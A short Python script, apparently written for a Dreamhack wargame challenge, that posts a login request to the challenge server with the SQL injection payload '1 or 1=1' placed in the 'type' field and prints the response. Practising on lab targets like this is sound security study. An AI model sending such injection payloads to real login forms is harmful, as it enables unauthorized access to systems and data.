import requests

website = "http://host3.dreamhack.games:20475/login_ok.php"

# [1] Error Trial
datas_error_trial = {
    'id': '1.229.141.247',
    'pw': 'test',
    'type': "1 or 1=1"}
for i in range(1):
    error_trial = requests.post(website, data=datas_error_trial)
    print(error_trial.text)
